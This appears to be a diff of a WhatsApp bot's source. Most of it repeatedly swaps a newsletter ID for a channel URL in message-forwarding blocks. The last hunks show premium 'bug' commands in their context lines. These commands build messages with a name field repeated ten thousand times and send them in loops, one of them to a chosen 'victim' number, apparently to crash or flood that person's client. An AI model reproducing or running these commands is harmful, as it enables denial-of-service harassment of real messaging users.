 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -21638,7 +21638,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -21719,7 +21719,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -21854,7 +21854,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -21988,7 +21988,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -22069,7 +22069,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -22204,7 +22204,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -22338,7 +22338,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -22419,7 +22419,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -22554,7 +22554,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -22688,7 +22688,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -22769,7 +22769,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -22904,7 +22904,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -23038,7 +23038,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -23119,7 +23119,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -23254,7 +23254,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -23388,7 +23388,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -23469,7 +23469,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -23604,7 +23604,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -23738,7 +23738,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -23819,7 +23819,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -23954,7 +23954,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -24088,7 +24088,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -24169,7 +24169,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -24304,7 +24304,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -24438,7 +24438,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -24519,7 +24519,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -24654,7 +24654,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -24788,7 +24788,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -24869,7 +24869,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -25004,7 +25004,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -25138,7 +25138,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -25219,7 +25219,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -25354,7 +25354,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -25488,7 +25488,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -25569,7 +25569,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -25704,7 +25704,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -25838,7 +25838,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -25919,7 +25919,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -26054,7 +26054,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -26188,7 +26188,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -26269,7 +26269,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -26404,7 +26404,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -26538,7 +26538,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -26619,7 +26619,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -26671,7 +26671,7 @@ break
 case 'xreact': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!m.quoted) return replygcxeon(`Example usage: ${prefix + command} reply chat`)
-await XeonBotInc.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+await XeonBotInc.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 await sleep(2000)
 await XeonBotInc.sendMessage(m.chat, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
 }
@@ -26681,7 +26681,7 @@ if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`) 
 amount = text * 30
 for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+await XeonBotInc.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 }
 }
 break
@@ -26692,7 +26692,7 @@ await loading()
 victim = text.split("|")[0]+"@s.whatsapp.net"
 amount = text.split("|")[1] * 30
 for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+await XeonBotInc.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 }
 replygcxeon(`Successfully Sent Bug To ${victim}`)
 }
